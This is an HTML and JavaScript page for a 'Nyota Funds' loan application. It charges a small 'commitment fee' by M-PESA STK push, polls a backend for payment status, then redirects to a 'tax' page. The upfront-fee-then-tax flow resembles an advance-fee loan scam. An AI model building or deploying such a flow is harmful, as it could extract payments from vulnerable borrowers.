<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Customer Commitment Fee - Nyota Funds</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}

body{
background:#0b6b0b;
padding:15px;
}

.container{
max-width:430px;
margin:auto;
}

.card{
background:#fff;
padding:20px;
border-radius:12px;
box-shadow:0 5px 15px rgba(0,0,0,.15);
}

h2{
text-align:center;
color:#1565c0;
margin-bottom:15px;
}

.success-box{
background:#e8f5e9;
padding:12px;
border-radius:10px;
color:#1b5e20;
text-align:center;
margin-bottom:15px;
font-size:15px;
}

.details{
background:#f7f7f7;
padding:15px;
border-radius:10px;
margin-bottom:15px;
}

.details p{
margin:10px 0;
font-size:15px;
}

button{
width:100%;
padding:15px;
margin-top:5px;
background:#1565c0;
color:white;
border:none;
border-radius:8px;
font-size:17px;
font-weight:bold;
cursor:pointer;
}

button:disabled{
background:#999;
}

#status{
margin-top:15px;
text-align:center;
font-size:15px;
line-height:1.5;
}

.secure{
margin-top:15px;
text-align:center;
font-size:13px;
color:#666;
}

</style>
</head>

<body>

<div class="container">

<div class="card">

<h2>Customer Commitment Fee</h2>

<div class="success-box">
Your NYOTA FUNDS application is almost complete.
</div>

<div class="details">

<p>
<b>Applicant:</b>
<span id="fullName">Loading...</span>
</p>

<p>
<b>Phone:</b>
<span id="phone">Loading...</span>
</p>

<p>
<b>Selected Fund:</b>
KSh <span id="fund">22,000</span>
</p>

<p>
<b>Commitment Fee:</b>
<span style="color:#1b5e20;font-weight:bold;">
KSh 3
</span>
</p>

</div>

<button id="payBtn" onclick="payCommitment()">
Pay Commitment Fee
</button>

<div id="status"></div>

<p class="secure">
🔒 Secure STK Push • Instant Confirmation
</p>

</div>

</div>


<script>

// ==========================================
// LOAD CUSTOMER DETAILS
// ==========================================

const fullName =
localStorage.getItem("fullName");

const phoneNumber =
localStorage.getItem("phoneNumber");

const selectedAmount =
localStorage.getItem("selectedAmount");


document.getElementById("fullName").textContent =
fullName || "Applicant";


document.getElementById("phone").textContent =
phoneNumber || "Not available";


document.getElementById("fund").textContent =
selectedAmount || "22,000";


// ==========================================
// PAY COMMITMENT FEE
// ==========================================

async function payCommitment(){

const phone =
localStorage.getItem("phoneNumber");

if(!phone){

document.getElementById("status").innerHTML =
"❌ Phone number not found. Please return to registration.";

return;

}

const btn =
document.getElementById("payBtn");

const status =
document.getElementById("status");


btn.disabled = true;

btn.innerHTML =
"Sending STK Push...";

status.innerHTML = "";


try{

const response = await fetch(
"https://nyota-funds-backend.onrender.com/stk-push",
{
method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

phone:phone,

// COMMITMENT FEE
amount:3

})
}
);


const data =
await response.json();

console.log("STK RESPONSE:",data);


// ==========================================
// CHECK FOR CHECKOUT ID
// ==========================================

const checkoutId =
data.checkout_request_id;


if(!checkoutId){

status.innerHTML =
"❌ STK Push could not be initiated.";

btn.disabled = false;

btn.innerHTML =
"Pay Commitment Fee";

return;

}


// ==========================================
// STK SENT
// ==========================================

status.innerHTML =
"📱 STK Push sent successfully.<br>Please enter your M-PESA PIN.";


// ==========================================
// CHECK PAYMENT STATUS
// ==========================================

checkPayment(checkoutId);

}catch(error){

console.error(error);

status.innerHTML =
"❌ Unable to send STK Push. Please try again.";

btn.disabled = false;

btn.innerHTML =
"Pay Commitment Fee";

}

}


// ==========================================
// PAYMENT STATUS CHECK
// ==========================================

async function checkPayment(checkoutId){

const interval =
setInterval(async()=>{

try{

const response = await fetch(
"https://nyota-funds-backend.onrender.com/payment-status",
{
method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

checkout_request_id:
checkoutId

})
}
);


const result =
await response.json();

console.log("PAYMENT STATUS:",result);


// ==========================================
// SUCCESS
// ==========================================

if(result.status === "completed"){

clearInterval(interval);

document.getElementById("status").innerHTML =
"✅ Commitment fee paid successfully.<br>Redirecting...";


setTimeout(()=>{

window.location.href =
"tax.html";

},1000);

}


// ==========================================
// FAILED
// ==========================================

else if(result.status === "failed"){

clearInterval(interval);

document.getElementById("status").innerHTML =
"❌ Payment failed.";

resetButton();

}


// ==========================================
// CANCELLED
// ==========================================

else if(result.status === "cancelled"){

clearInterval(interval);

document.getElementById("status").innerHTML =
"❌ Payment cancelled.";

resetButton();

}

}catch(error){

console.error(
"Payment status error:",
error
);

}

},3000);

}


// ==========================================
// RESET BUTTON
// ==========================================

function resetButton(){

const btn =
document.getElementById("payBtn");

btn.disabled = false;

btn.innerHTML =
"Pay Commitment Fee";

}

</script>

</body>
</html>
